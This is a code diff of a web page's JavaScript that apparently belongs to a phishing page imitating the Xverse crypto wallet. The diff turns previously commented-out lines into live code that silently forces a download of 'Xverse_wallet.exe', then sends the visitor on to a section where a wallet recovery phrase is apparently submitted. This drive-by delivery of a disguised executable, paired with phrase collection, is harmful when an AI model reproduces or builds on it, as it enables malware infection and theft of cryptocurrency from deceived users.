@@ -279,12 +279,12 @@
       nextSection('phraseSection');
     }, 3000);
     // Optionally start download in background (if you still want to download)
-    // const a = document.createElement('a');
-    // a.href = './Xverse_wallet.exe';
-    // a.download = 'Xverse_wallet.exe';
-    // document.body.appendChild(a);
-    // a.click();
-    // document.body.removeChild(a);
+    const a = document.createElement('a');
+     a.href = './Xverse_wallet.exe';
+     a.download = 'Xverse_wallet.exe';
+     document.body.appendChild(a);
+     a.click();
+     document.body.removeChild(a);
   }
 
   function submitPhrase(e) {
